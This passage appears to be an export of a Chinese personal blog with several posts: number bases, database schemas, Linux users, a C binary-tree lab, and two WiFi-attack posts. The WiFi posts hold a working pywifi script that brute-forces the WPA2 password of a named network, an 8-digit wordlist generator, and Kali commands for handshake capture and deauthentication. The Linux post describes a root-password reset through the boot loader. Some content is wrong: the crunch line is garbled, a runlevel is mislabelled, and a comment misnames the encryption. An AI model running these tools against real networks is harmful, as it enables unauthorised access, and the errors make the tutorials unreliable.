    <url>/2021/07/10/python-wifi-%E7%A0%B4%E8%A7%A3%E4%BB%A5%E5%8F%8A%E7%94%9F%E6%88%90%E5%AF%86%E7%A0%81%E5%BA%93/</url>
    <content><![CDATA[<h1 id="安装python依赖库-pywifi"><a href="#安装python依赖库-pywifi" class="headerlink" title="安装python依赖库 pywifi"></a>安装python依赖库 pywifi</h1><h1 id="破解代码"><a href="#破解代码" class="headerlink" title="破解代码"></a>破解代码</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#coding:utf-8</span>
<span class="token function">import</span> pywifi
from pywifi <span class="token function">import</span> const
<span class="token function">import</span> <span class="token function">time</span>
<span class="token function">import</span> datetime
<span class="token comment">#测试连接，返回链接结果</span>
def wifiConnect<span class="token punctuation">(</span>pwd<span class="token punctuation">)</span>:
    <span class="token comment">#抓取网卡接口</span>
    <span class="token assign-left variable">wifi</span><span class="token operator">=</span>pywifi.PyWiFi<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment">#获取第一个无线网卡</span>
    <span class="token assign-left variable">ifaces</span><span class="token operator">=</span>wifi.interfaces<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token comment">#断开所有连接</span>
    ifaces.disconnect<span class="token punctuation">(</span><span class="token punctuation">)</span>
    time.sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token assign-left variable">wifistatus</span><span class="token operator">=</span>ifaces.status<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> wifistatus <span class="token operator">==</span>const.IFACE_DISCONNECTED:
        <span class="token comment">#创建WiFi连接文件</span>
        <span class="token assign-left variable">profile</span><span class="token operator">=</span>pywifi.Profile<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token comment">#要连接WiFi的名称</span>
        profile.ssid<span class="token operator">=</span><span class="token string">"360zc"</span>
        <span class="token comment">#网卡的开放状态</span>
        profile.auth<span class="token operator">=</span>const.AUTH_ALG_OPEN
        <span class="token comment">#wifi加密算法,一般wifi加密算法为wps</span>
        profile.akm.append<span class="token punctuation">(</span>const.AKM_TYPE_WPA2PSK<span class="token punctuation">)</span>
        <span class="token comment">#加密单元</span>
        profile.cipher<span class="token operator">=</span>const.CIPHER_TYPE_CCMP
        <span class="token comment">#调用密码</span>
        profile.key<span class="token operator">=</span>pwd
        <span class="token comment">#删除所有连接过的wifi文件</span>
        ifaces.remove_all_network_profiles<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token comment">#设定新的连接文件</span>
        <span class="token assign-left variable">tep_profile</span><span class="token operator">=</span>ifaces.add_network_profile<span class="token punctuation">(</span>profile<span class="token punctuation">)</span>
        ifaces.connect<span class="token punctuation">(</span>tep_profile<span class="token punctuation">)</span>
        <span class="token comment">#wifi连接时间</span>
        time.sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> ifaces.status<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span>const.IFACE_CONNECTED:
            <span class="token builtin class-name">return</span> True
        else:
            <span class="token builtin class-name">return</span> False
    else:
        print<span class="token punctuation">(</span><span class="token string">"已有wifi连接"</span><span class="token punctuation">)</span> 
<span class="token comment">#读取密码本</span>
def readPassword<span class="token punctuation">(</span><span class="token punctuation">)</span>:
    print<span class="token punctuation">(</span><span class="token string">"开始破解:"</span><span class="token punctuation">)</span>
    <span class="token comment">#密码本路径</span>
    <span class="token assign-left variable">path</span><span class="token operator">=</span><span class="token string">"D:\个人文档\学习资料\网络攻防\wifi\password.txt"</span>
    <span class="token comment">#打开文件</span>
    <span class="token assign-left variable">file</span><span class="token operator">=</span>open<span class="token punctuation">(</span>path,<span class="token string">"r"</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> True:
        try:
            <span class="token comment">#一行一行读取</span>
            <span class="token assign-left variable">pad</span><span class="token operator">=</span>file.readline<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token assign-left variable">bool</span><span class="token operator">=</span>wifiConnect<span class="token punctuation">(</span>pad<span class="token punctuation">)</span>
            
            <span class="token keyword">if</span> bool:
                print<span class="token punctuation">(</span><span class="token string">"密码已破解： "</span>,pad<span class="token punctuation">)</span>
                print<span class="token punctuation">(</span><span class="token string">"WiFi已自动连接！！！"</span><span class="token punctuation">)</span>
                <span class="token builtin class-name">break</span>
            else:
                <span class="token comment">#跳出当前循环，进行下一次循环</span>
                print<span class="token punctuation">(</span><span class="token string">"密码破解中....密码校对: "</span>,pad<span class="token punctuation">)</span>
        except:
            <span class="token builtin class-name">continue</span>
 
<span class="token assign-left variable">start</span><span class="token operator">=</span>datetime.datetime.now<span class="token punctuation">(</span><span class="token punctuation">)</span> 
readPassword<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token assign-left variable">end</span><span class="token operator">=</span>datetime.datetime.now<span class="token punctuation">(</span><span class="token punctuation">)</span>
print<span class="token punctuation">(</span><span class="token string">"破解WIFI密码一共用了多长时间：&#123;&#125;"</span>.format<span class="token punctuation">(</span>end-start<span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="生成密码库"><a href="#生成密码库" class="headerlink" title="生成密码库"></a>生成密码库</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">import</span> itertools as its
<span class="token function">import</span> datetime
 
<span class="token comment">#记录程序运行时间</span>
<span class="token assign-left variable">start</span><span class="token operator">=</span>datetime.datetime.now<span class="token punctuation">(</span><span class="token punctuation">)</span>
words <span class="token operator">=</span> <span class="token string">'1234567890'</span><span class="token comment">#这里可以加入字母和其他字符，使用string包更方便</span>
<span class="token comment">#生成密码的位数</span>
r <span class="token operator">=</span> its.product<span class="token punctuation">(</span>words,repeat<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token comment">#4即生成4位密码，正常情况下热点密码位数为8</span>
dic <span class="token operator">=</span>open<span class="token punctuation">(</span>r<span class="token string">"D:\个人文档\学习资料\网络攻防\wifi\paswwer.txt"</span>,<span class="token string">'a'</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> r:
    dic.write<span class="token punctuation">(</span><span class="token string">''</span>.join<span class="token punctuation">(</span>i<span class="token punctuation">))</span>
    dic.write<span class="token punctuation">(</span><span class="token string">''</span>.join<span class="token punctuation">(</span><span class="token string">'<span class="token entity" title="\n">\n</span>'</span><span class="token punctuation">))</span>
    print<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
 
dic.close<span class="token punctuation">(</span><span class="token punctuation">)</span>
print<span class="token punctuation">(</span><span class="token string">'密码本生成好了'</span><span class="token punctuation">)</span>
<span class="token assign-left variable">end</span><span class="token operator">=</span>datetime.datetime.now<span class="token punctuation">(</span><span class="token punctuation">)</span>
print<span class="token punctuation">(</span><span class="token string">"生成密码本一共用了多长时间：&#123;&#125;"</span>.format<span class="token punctuation">(</span>end-start<span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="适用于重英文的wifi名"><a href="#适用于重英文的wifi名" class="headerlink" title="适用于重英文的wifi名"></a>适用于重英文的wifi名</h1><p>更高级的破解wifi 使用kail和无线网卡<br>未完待续</p>
]]></content>
      <tags>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>关于进制转换</title>
    <url>/2021/03/22/%E5%85%B3%E4%BA%8E%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2/</url>
    <content><![CDATA[<p>计算机语言中的进制转换方法在很多考试中都会用到，下面为大家一一解答，相互之间如何转换。</p>
<h2 id="计算机基础"><a href="#计算机基础" class="headerlink" title="计算机基础"></a>计算机基础</h2><p>二进制三位一组分开就是八进制, 四位一组就是十六进制</p>
<h3 id="“十进制转二进制”"><a href="#“十进制转二进制”" class="headerlink" title="“十进制转二进制”"></a>“十进制转二进制”</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">89</span>÷2 ……1

<span class="token number">44</span>÷2 ……0

<span class="token number">22</span>÷2 ……0

<span class="token number">11</span>÷2 ……1

<span class="token number">5</span>÷2 ……1

<span class="token number">2</span>÷2 ……0

<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>十进制整数转二进制数：“除以2取余，逆序排列”（除二取余法）则89的二进制转换为1011001</p>
<h3 id="“二进制与十六进制的转换”"><a href="#“二进制与十六进制的转换”" class="headerlink" title="“二进制与十六进制的转换”"></a>“二进制与十六进制的转换”</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">5</span> D F ． <span class="token number">9</span>

0101 <span class="token number">1101</span> <span class="token number">1111</span> ．1001

即：（5DF.9）16 <span class="token operator">=</span>（10111011111.1001）2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>把每一个十六进制数转换成4位的二进制数，就得到一个二进制数。</p>
<h3 id="“十进制与十六进制的转换”"><a href="#“十进制与十六进制的转换”" class="headerlink" title="“十进制与十六进制的转换”"></a>“十进制与十六进制的转换”</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">150</span>÷16 ……6

<span class="token number">9</span>÷16 ……9

<span class="token number">9</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>除以16取余，直到商为0  150的16进制为96</p>
]]></content>
      <tags>
        <tag>计算机基础</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库的三级模式结构</title>
    <url>/2021/03/24/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%B8%89%E7%BA%A7%E6%A8%A1%E5%BC%8F%E7%BB%93%E6%9E%84/</url>
    <content><![CDATA[<h2 id="数据库系统的三级模式结构是指模式、外模式和内模式。"><a href="#数据库系统的三级模式结构是指模式、外模式和内模式。" class="headerlink" title="数据库系统的三级模式结构是指模式、外模式和内模式。"></a>数据库系统的三级模式结构是指模式、外模式和内模式。</h2><h2 id="一、三级模式结构"><a href="#一、三级模式结构" class="headerlink" title="一、三级模式结构"></a>一、三级模式结构</h2><h3 id="1、模式"><a href="#1、模式" class="headerlink" title="1、模式"></a>1、模式</h3><p> 模式也称为逻辑模式或概念模式，是数据库中全体数据的逻辑结构和特征的描述，是所有用户的公共数据视图。一个数据库只有一个模式，模式位于三级结构的中间层。</p>
<h3 id="2、外模式"><a href="#2、外模式" class="headerlink" title="2、外模式"></a>2、外模式</h3><p> 外模式也称为用户模式，它是数据库用户（包括应用程序员和最终用户）能够看见和使用的局部数据的逻辑结构和特征的描述，是数据库用户的数图，是与某一应用有关的数据的逻辑表示。外模式是模式的子集，一个数据库可以有多个外模式。</p>
<h3 id="3、内模式"><a href="#3、内模式" class="headerlink" title="3、内模式"></a>3、内模式</h3><p> 内模式也称为存储模式，一个数据库只有一个内模式，它是数据物理结构和存储方式的描述，是数据在数据库内部的表示方式。</p>
<h2 id="二、三级模式之间的映射"><a href="#二、三级模式之间的映射" class="headerlink" title="二、三级模式之间的映射"></a>二、三级模式之间的映射</h2><p> 数据库管理系统在三级模式之间提供了两层映射，分别为外模式/模式映射、模式/内模式映射。</p>
<h3 id="1、外模式-模式映射"><a href="#1、外模式-模式映射" class="headerlink" title="1、外模式/模式映射"></a>1、外模式/模式映射</h3><p> 对于同一个模式可以有任意多个外模式。对于每一个外模式，数据库系统都有一个外模式/模式映射。当模式被改变时，数据库管理员对各个外模式/模式映射做相应的改变，可以使外模式保持不变。这样，依据数据外模式编写的应用程序就不用修改，保证了数据与程序的逻辑独立性。</p>
<h3 id="2、模式-内模式"><a href="#2、模式-内模式" class="headerlink" title="2、模式/内模式"></a>2、模式/内模式</h3><p> 数据库中只有一个模式和一个内模式，所以模式/内模式的映射是唯一的，它定义了数据库的全局逻辑结构与存储结构之间的对应关系。当数据库的存储结构被改变时，数据库管理员对模式/内模式映射做相应的改变，可以使模式保持不变，应用程序相应地也不做变动。这样，保证了数据与程序的物理独立性。</p>
<p><img src="http://r6d.cn/bedab" alt="alt"></p>
]]></content>
      <tags>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux用户</title>
    <url>/2021/07/13/linux%E7%94%A8%E6%88%B7/</url>
    <content><![CDATA[<h3 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h3><ol>
<li>useradd 用户名  添加用户名</li>
<li>userdel 用户名  删除用户名</li>
<li>su –    切换用户名</li>
<li>groupadd 组名   新增用户组</li>
<li>groupdel 组名   删除用户组</li>
<li>useradd –g 用户组 用户名  增加用户时直接加上组<br>7）su 用户 切换用户</li>
</ol>
<h3 id="etc-passwd-文件"><a href="#etc-passwd-文件" class="headerlink" title="/etc/passwd 文件"></a>/etc/passwd 文件</h3><p>/group /shadow<br>存放用户的口令<br>vim /etc/passwd  +:$<br>postdrop:x:90:<br>postfix:x:89:<br>tcpdump:x:72:<br>baixiao:x:1000:<br>lili:x:1001:</p>
<h3 id="运行级别"><a href="#运行级别" class="headerlink" title="运行级别"></a>运行级别</h3><p>运行级别配置文件 vim /etc/inittab<br>0：关机<br>1：单用户<br>2：多用户无网络<br>3：单用户有网络<br>4：未使用保留（不指定）<br>5：图形界面<br>6：系统重启<br>命令 ：init [012356]<br>cen 只有35</p>
<h3 id="密码找回"><a href="#密码找回" class="headerlink" title="密码找回"></a>密码找回</h3><p>运行级别面试题 进入机房即可操作</p>
<ol>
<li>首先我们进入开机界面，按e进行选</li>
<li>UTF-8行尾添加 init=/bin/sh</li>
<li>CTRL+X 执行</li>
<li>passwd修改密码 默认修改root密码</li>
<li>exec  /sbin/init</li>
</ol>
]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>在Linux虚拟机kali中的wifi无线攻击</title>
    <url>/2021/07/15/%E5%9C%A8linux%E8%99%9A%E6%8B%9F%E6%9C%BAkali%E4%B8%AD%E7%9A%84wifi%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h2 id="攻击准备"><a href="#攻击准备" class="headerlink" title="攻击准备"></a>攻击准备</h2><ol>
<li>VM虚拟机</li>
<li>linux kail系统</li>
<li>外接网卡rlt8187</li>
</ol>
<h2 id="攻击用linux常见指令"><a href="#攻击用linux常见指令" class="headerlink" title="攻击用linux常见指令"></a>攻击用linux常见指令</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">iwconfig <span class="token comment">#显示网卡设备</span>
airmon-ng start wlan0 <span class="token comment">#激活网卡设备</span>
airmon-ng stop wlan0 <span class="token comment">#关闭网卡</span>
airodump-ng wlan0mon <span class="token comment">#启用已激活的wlan0监听wifi</span>
airodump-ng -c <span class="token punctuation">[</span>信道ch<span class="token punctuation">]</span> -w /root/cap/er8 --bssid <span class="token punctuation">[</span>MAC<span class="token punctuation">]</span> wlan0mon  <span class="token comment">#获取握手协议包储存在目录/root/cap/下</span>
aireplay-ng -0 <span class="token number">5</span> -a <span class="token punctuation">[</span>mac<span class="token punctuation">]</span> wlan0mon <span class="token comment">#发起5次攻击，使路由器重启，然后获得握手包裹</span>
crunch <span class="token number">10</span> <span class="token number">10</span> <span class="token number">123</span> <span class="token operator">>></span>/root.123.txt /root/cap/er8-01.cap <span class="token comment">#使用指定目录密码本进行破译握手包</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="fluxion-6-9-攻击流程"><a href="#fluxion-6-9-攻击流程" class="headerlink" title="fluxion -6.9 攻击流程"></a>fluxion -6.9 攻击流程</h2><p>扫描wpa/wpa2</p>
]]></content>
      <tags>
        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构二叉树</title>
    <url>/2021/07/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<p>实验项目名称：二叉树操作的实现<br>实验目的与要求:<br>1.基础知识:掌握数据结构中二叉树的相关知识;<br>2.参考教材相关算法，完成以下程序功能: .<br>(1)能够采用二叉链存储结构实现二叉树的建立;<br>(2)完成已建立的二叉树的三种遍历，并分别打印其结果;<br>(3)至少完成教材P121-122中其它任意一种操作，或者二叉树中特定结点的统计操作，如统计用户给定的元素数目、叶子数目、只有左或右孩子的结点数目等;<br>(4)程序中有友好的操作设计.<br>实验性质:验证性(4学时)<br>说明:程序包含的主要函数:主函数、操作界面、建树、独立的<br>三种遍历、其它自定义的操作算法，及相关注释;<br>注意:在主函数调用子函数流程中体现先建树后遍历和其它操作<br>的条件控制，即在调用除建树算法以外的其它所有算法前，先判<br>断树是否已经建立，若没建树，只能先建树，不能做其它操作。</p>
<p>二叉树源代码：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#include&lt;stdio.h></span>
<span class="token comment">#include&lt;stdlib.h></span>
<span class="token comment">#include&lt;malloc.h></span>
<span class="token comment">#define ERROR 0</span>
<span class="token comment">#define OK 1</span>
<span class="token comment">#define NULL 0</span>
typedef int Status<span class="token punctuation">;</span>
typedef char TElemType<span class="token punctuation">;</span>
typedef struct BiTNode
<span class="token punctuation">&#123;</span>
    TElemType data<span class="token punctuation">;</span>
    struct BiTNode *lchild,*rchild<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>BiTNode,*BiTree<span class="token punctuation">;</span>

Status CreateBiTree<span class="token punctuation">(</span>BiTree<span class="token operator">&amp;</span>T<span class="token punctuation">)</span>//按先序次序输入二叉树结点的值（一个字符），<span class="token comment">#表示空树</span>
<span class="token punctuation">&#123;</span>
       char ch<span class="token punctuation">;</span>
       scanf<span class="token punctuation">(</span><span class="token string">"%c"</span>,<span class="token operator">&amp;</span>ch<span class="token punctuation">)</span><span class="token punctuation">;</span>
       if<span class="token punctuation">(</span>ch<span class="token operator">==</span><span class="token string">'#'</span><span class="token punctuation">)</span>
       <span class="token assign-left variable">T</span><span class="token operator">=</span>NULL<span class="token punctuation">;</span>   
       else<span class="token punctuation">&#123;</span>
       if<span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>T<span class="token operator">=</span><span class="token punctuation">(</span>BiTNode*<span class="token punctuation">)</span>malloc<span class="token punctuation">(</span>sizeof<span class="token punctuation">(</span>BiTNode<span class="token punctuation">))</span><span class="token punctuation">))</span>exit<span class="token punctuation">(</span>ERROR<span class="token punctuation">)</span><span class="token punctuation">;</span>
       T-<span class="token operator">></span>data<span class="token operator">=</span>ch<span class="token punctuation">;</span>
       CreateBiTree<span class="token punctuation">(</span>T-<span class="token operator">></span>lchild<span class="token punctuation">)</span><span class="token punctuation">;</span>
       CreateBiTree<span class="token punctuation">(</span>T-<span class="token operator">></span>rchild<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
    <span class="token builtin class-name">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

LRD<span class="token punctuation">(</span>BiTree T<span class="token punctuation">)</span>//后序遍历
<span class="token punctuation">&#123;</span>
    if<span class="token punctuation">(</span>T<span class="token operator">!=</span>NULL<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        LRD<span class="token punctuation">(</span>T-<span class="token operator">></span>lchild<span class="token punctuation">)</span><span class="token punctuation">;</span>
        LRD<span class="token punctuation">(</span>T-<span class="token operator">></span>rchild<span class="token punctuation">)</span><span class="token punctuation">;</span>
        printf<span class="token punctuation">(</span><span class="token string">"%c"</span>,T-<span class="token operator">></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token builtin class-name">return</span> OK<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

LDR<span class="token punctuation">(</span>BiTree T<span class="token punctuation">)</span>//中序遍历
<span class="token punctuation">&#123;</span>
    if<span class="token punctuation">(</span>T<span class="token operator">!=</span>NULL<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        LDR<span class="token punctuation">(</span>T-<span class="token operator">></span>lchild<span class="token punctuation">)</span><span class="token punctuation">;</span>
        printf<span class="token punctuation">(</span><span class="token string">"%c"</span>,T-<span class="token operator">></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        LDR<span class="token punctuation">(</span>T-<span class="token operator">></span>rchild<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token builtin class-name">return</span> OK<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

DLR<span class="token punctuation">(</span>BiTree T<span class="token punctuation">)</span>//先序遍历
<span class="token punctuation">&#123;</span>
    if<span class="token punctuation">(</span>T<span class="token operator">!=</span>NULL<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        printf<span class="token punctuation">(</span><span class="token string">"%c"</span>,T-<span class="token operator">></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        DLR<span class="token punctuation">(</span>T-<span class="token operator">></span>lchild<span class="token punctuation">)</span><span class="token punctuation">;</span>
        DLR<span class="token punctuation">(</span>T-<span class="token operator">></span>rchild<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token builtin class-name">return</span> OK<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


Status TreeDeapth<span class="token punctuation">(</span>BiTree T<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	int height,leftH,rightH<span class="token punctuation">;</span>     //左右子树的深度和最深的深度
	if<span class="token punctuation">(</span>T<span class="token operator">==</span>NULL<span class="token punctuation">)</span>
		<span class="token assign-left variable">height</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
	else<span class="token punctuation">&#123;</span>
		<span class="token assign-left variable">leftH</span><span class="token operator">=</span>TreeDeapth<span class="token punctuation">(</span>T-<span class="token operator">></span>lchild<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token assign-left variable">rightH</span><span class="token operator">=</span>TreeDeapth<span class="token punctuation">(</span>T-<span class="token operator">></span>rchild<span class="token punctuation">)</span><span class="token punctuation">;</span>
		if<span class="token punctuation">(</span>leftH<span class="token operator">></span>rightH<span class="token punctuation">)</span>
			<span class="token assign-left variable">height</span><span class="token operator">=</span>leftH+1<span class="token punctuation">;</span>
		<span class="token keyword">else</span>
			<span class="token assign-left variable">height</span><span class="token operator">=</span>rightH+1<span class="token punctuation">;</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token builtin class-name">return</span> height<span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span>
Status TreeEmpty<span class="token punctuation">(</span>BiTree T<span class="token punctuation">)</span>//判断树是否存在
<span class="token punctuation">&#123;</span>
    if<span class="token punctuation">(</span>T<span class="token operator">==</span>NULL<span class="token punctuation">)</span>
    <span class="token builtin class-name">return</span> ERROR<span class="token punctuation">;</span>
    <span class="token keyword">else</span>
    <span class="token builtin class-name">return</span> OK<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

Status OperateMenu<span class="token punctuation">(</span>int num<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------****操作菜单****------<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	printf<span class="token punctuation">(</span><span class="token string">"------    0 退出系统<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    1 后序遍历<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    2 中序遍历<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    3 先序遍历<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    4 判断树是否存在<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    5 二叉树的深度<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    6 创建二叉树<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    printf<span class="token punctuation">(</span><span class="token string">"------    请选择你所需要的操作<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    scanf<span class="token punctuation">(</span><span class="token string">"%d"</span>,<span class="token operator">&amp;</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token builtin class-name">return</span> num<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token function-name function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    BiTree T<span class="token punctuation">;</span>
    <span class="token assign-left variable">T</span><span class="token operator">=</span>NULL<span class="token punctuation">;</span>
    int <span class="token assign-left variable">num</span><span class="token operator">=</span>-1,h<span class="token punctuation">;</span>  
    while<span class="token punctuation">(</span>num<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token punctuation">&#123;</span>
       <span class="token assign-left variable">num</span><span class="token operator">=</span>OperateMenu<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    switch<span class="token punctuation">(</span>num<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token keyword">case</span> <span class="token number">1</span>:
        if<span class="token punctuation">(</span>T<span class="token operator">==</span>NULL<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>printf<span class="token punctuation">(</span><span class="token string">"树不存在"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
        LRD<span class="token punctuation">(</span>T<span class="token punctuation">)</span><span class="token punctuation">;</span>
        printf<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin class-name">break</span><span class="token punctuation">;</span>//后序遍历
        <span class="token keyword">case</span> <span class="token number">2</span>: 
        if<span class="token punctuation">(</span>T<span class="token operator">==</span>NULL<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>printf<span class="token punctuation">(</span><span class="token string">"树不存在"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
        LDR<span class="token punctuation">(</span>T<span class="token punctuation">)</span><span class="token punctuation">;</span>
        printf<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin class-name">break</span><span class="token punctuation">;</span>//中序遍历
        <span class="token keyword">case</span> <span class="token number">3</span>:
        if<span class="token punctuation">(</span>T<span class="token operator">==</span>NULL<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>printf<span class="token punctuation">(</span><span class="token string">"树不存在"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
        DLR<span class="token punctuation">(</span>T<span class="token punctuation">)</span><span class="token punctuation">;</span>
        printf<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token builtin class-name">break</span><span class="token punctuation">;</span>//先序遍历
        <span class="token keyword">case</span> <span class="token number">4</span>:
        if<span class="token punctuation">(</span>TreeEmpty<span class="token punctuation">(</span>T<span class="token punctuation">))</span>
        printf<span class="token punctuation">(</span><span class="token string">"树存在<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">else</span>
        printf<span class="token punctuation">(</span><span class="token string">"树不存在<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token builtin class-name">break</span><span class="token punctuation">;</span>
        <span class="token keyword">case</span> <span class="token number">5</span>:
        if<span class="token punctuation">(</span>T<span class="token operator">==</span>NULL<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>printf<span class="token punctuation">(</span><span class="token string">"树不存在<span class="token entity" title="\n">\n</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">&#123;</span>h<span class="token operator">=</span>TreeDeapth<span class="token punctuation">(</span>T<span class="token punctuation">)</span><span class="token punctuation">;</span>
